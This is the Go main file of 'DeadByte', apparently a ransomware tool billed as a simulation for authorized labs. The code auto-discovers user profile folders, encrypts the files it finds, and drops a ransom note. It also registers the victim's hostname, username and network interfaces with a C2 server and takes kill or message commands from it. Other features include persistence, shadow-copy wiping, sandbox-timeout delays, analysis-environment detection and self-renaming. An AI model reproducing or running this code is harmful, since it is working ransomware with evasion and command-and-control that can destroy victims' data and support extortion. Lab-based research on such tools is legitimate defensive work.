// DeadByte payload: cross-platform ransomware simulation for authorized labs.
package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"deadbyte/internal/beacon"
	"deadbyte/internal/stealth"
	"deadbyte/internal/types"
	"deadbyte/internal/walker"
)

var (
	cfg      Config
	verbose  bool
	killFlag atomic.Bool
	beaconOn atomic.Bool
	stats    Stats
)

func logf(format string, args ...any) {
	if verbose {
		log.Printf(format, args...)
	}
}

// openLogFile appends the log to path (0600) while keeping stderr, so every
// FATAL/verbose line is visible even when the console window is hidden.
func openLogFile(path string) (*os.File, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return nil, err
	}
	log.SetOutput(io.MultiWriter(os.Stderr, f))
	return f, nil
}

// fail logs a fatal error and exits non-zero (always visible in -log-file).
func fail(format string, args ...any) {
	log.Printf("FATAL: "+format, args...)
	os.Exit(1)
}

// logFileFromArgs opens -log-file (if present in os.Args) before config
// parsing, so FATAL config errors (e.g. invalid blob) are still recorded.
func logFileFromArgs() (*os.File, bool) {
	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		if args[i] == "-log-file" && i+1 < len(args) {
			f, err := openLogFile(args[i+1])
			if err != nil {
				fail("could not open -log-file %s: %v", args[i+1], err)
			}
			return f, true
		}
	}
	return nil, false
}

func main() {
	// Open the log file first: even fatal config errors (bad blob, bad flags)
	// must be recorded for hidden-window diagnostics.
	var logFile *os.File
	if lf, ok := logFileFromArgs(); ok {
		logFile = lf
		defer logFile.Close()
	}

	var err error
	cfg, err = parseConfig()
	if err != nil {
		fail("config: %v", err)
	}
	verbose = cfg.Verbose
	beaconOn.Store(true)

	// The config blob may carry log_file; honor it when not set via CLI.
	if cfg.LogFile != "" && logFile == nil {
		lf, err := openLogFile(cfg.LogFile)
		if err != nil {
			fail("could not open -log-file %s: %v", cfg.LogFile, err)
		}
		logFile = lf
		defer logFile.Close()
	}
	if logFile != nil {
		logf("log file: %s", cfg.LogFile)
	}

	// Auto-discovery of user profiles when no -dirs is given.
	if cfg.Dirs == "" {
		cfg.Dirs = strings.Join(defaultTargetDirs(), ",")
		if cfg.Dirs == "" {
			fail("no user directory found (USERPROFILE=%q HOME=%q); use -dirs",
				os.Getenv("USERPROFILE"), os.Getenv("HOME"))
		}
		logf("target dirs (auto-descobertos): %s", cfg.Dirs)
	}

	// Single instance per host.
	tag := "dbp-" + shortHash(cfg.PubKey)
	release, err := stealth.SingleInstance(tag)
	if err != nil {
		logf("single instance: %v", err)
		return
	}
	defer release()

	// Optional execution delay (sandbox timeout evasion).
	if cfg.Delay > 0 {
		logf("sleeping %ds before execution", cfg.Delay)
		stealth.SleepJittered(time.Duration(cfg.Delay)*time.Second, float64(cfg.Jitter), nil)
	}

	// Anti-analysis heuristic abort (skip with -force).
	if !cfg.Force {
		if hits := stealth.LooksLikeAnalysisEnv(); len(hits) > 0 {
			fail("analysis environment detected (%s); use -force in an authorized lab", strings.Join(hits, ","))
		}
	}

	// Self-rename: re-exec from a random temp path (drops original name).
	if cfg.SelfRename {
		spoofed, err := stealth.SpoofSelf("DB_SPOOFED")
		if err == nil && spoofed {
			return
		}
	}

	// Safety: refuse root/elevated unless forced.
	if !cfg.Force && isElevated() {
		fail("elevated execution detected; use -force in an authorized lab")
	}

	// --- C2 beacon ---
	victimID := offlineID()
	var bc *beacon.Client
	interval := time.Duration(cfg.Interval) * time.Second
	if cfg.C2 != "" && !cfg.Offline {
		bc = beacon.New(cfg.C2, cfg.Token, cfg.Insecure)
		resp, err := bc.Register(types.BeaconReq{
			Hostname:   hostname(),
			Username:   username(),
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			PID:        os.Getpid(),
			Version:    types.Version,
			Interfaces: interfaces(),
			Dirs:       strings.Split(cfg.Dirs, ","),
		})
		if err != nil {
			logf("beacon register failed: %v (continuing offline)", err)
		} else {
			victimID = resp.ID
			if resp.Interval > 0 {
				interval = time.Duration(resp.Interval) * time.Second
			}
			logf("registered as %s, heartbeat every %ds", victimID, int(interval.Seconds()))
		}
	}

	// --- optional persistence / cleanup ---
	if cfg.Persist {
		if p, err := stealth.Persist("deadbyte"); err != nil {
			logf("persistence failed: %v", err)
		} else {
			logf("persistence installed at %s", p)
		}
	}
	if cfg.WipeVSS {
		wipeVSS()
	}

	// --- encryption loop ---
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	heartbeatCh := make(chan struct{})
	if bc != nil {
		go heartbeatLoop(ctx, bc, victimID, interval, heartbeatCh)
		heartbeatCh <- struct{}{} // initial status
	}

	opts := walker.Options{
		Roots:        strings.Split(cfg.Dirs, ","),
		ExtAllow:     cfg.extAllow(),
		ExtDeny:      walker.DefaultDenyExts(),
		SkipDirs:     walker.DefaultSkipDirs(),
		SkipNameDirs: walker.DefaultSkipNameDirs(),
		SkipFiles:    append(walker.DefaultDenyFiles(), cfg.NoteName),
		MaxSize:      cfg.MaxSize,
		SelfExe:      selfExe(),
	}
	for i := range opts.Roots {
		opts.Roots[i] = filepath.Clean(strings.TrimSpace(opts.Roots[i]))
	}

	if cfg.DryRun {
		found, err := walker.Walk(opts, func(path string, size int64) error {
			if verbose {
				log.Printf("target: %s (%d bytes)", path, size)
			}
			stats.Files++
			stats.Bytes += size
			return nil
		})
		logf("dry-run: %d targets", found)
		if err != nil {
			logf("walk error: %v", err)
		}
	} else {
		var processed int
		lastBeat := time.Now()
		_, err := walker.Walk(opts, func(path string, size int64) error {
			if killFlag.Load() {
				return errStop
			}
			if err := encryptOne(cfg.PubKey, path, false, &stats); err != nil {
				logf("encrypt %s: %v", path, err)
			} else if verbose {
				logf("encrypted: %s", path)
			}
			processed++
			if cfg.MaxFiles > 0 && processed >= cfg.MaxFiles {
				return errStop
			}
			// Throttled heartbeat during long walks.
			if time.Since(lastBeat) > 10*time.Second {
				select {
				case heartbeatCh <- struct{}{}:
				default:
				}
				lastBeat = time.Now()
			}
			return nil
		})
		if err != nil && err != errStop {
			logf("walk error: %v", err)
		}
	}

	// --- ransom note ---
	if !cfg.DryRun {
		_ = writeNote(cfg, victimID)
	}

	// --- final heartbeat ---
	if bc != nil {
		hc := types.HeartbeatReq{ID: victimID, Phase: "done", Files: stats.Files, Bytes: stats.Bytes, Errors: stats.Errors}
		if killFlag.Load() {
			hc.Phase = "killed"
		}
		_, _ = bc.Heartbeat(hc)
	}
	logf("done: %d files, %d bytes, %d errors", stats.Files, stats.Bytes, stats.Errors)
}

var errStop = fmt.Errorf("stop")

func heartbeatLoop(ctx context.Context, bc *beacon.Client, id string, interval time.Duration, tick <-chan struct{}) {
	t := time.NewTicker(interval)
	defer t.Stop()
	send := func() {
		if !beaconOn.Load() {
			return
		}
		phase := "encrypting"
		if stats.Files == 0 {
			phase = "walking"
		}
		cmds, err := bc.Heartbeat(types.HeartbeatReq{
			ID: id, Phase: phase, Files: stats.Files, Bytes: stats.Bytes, Errors: stats.Errors,
		})
		if err != nil {
			logf("heartbeat: %v", err)
			return
		}
		for _, c := range cmds {
			handleCommand(c)
		}
	}
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			send()
		case <-tick:
			send()
		}
	}
}

func handleCommand(c types.Command) {
	switch c.Type {
	case types.CmdKill:
		logf("command: kill")
		killFlag.Store(true)
	case types.CmdBeaconOff:
		logf("command: beacon_off")
		beaconOn.Store(false)
	case types.CmdProof:
		logf("command: proof (simulation)")
	case types.CmdMessage:
		logf("command: message -> %q", c.Value)
	default:
		logf("command: unknown %q", c.Type)
	}
}
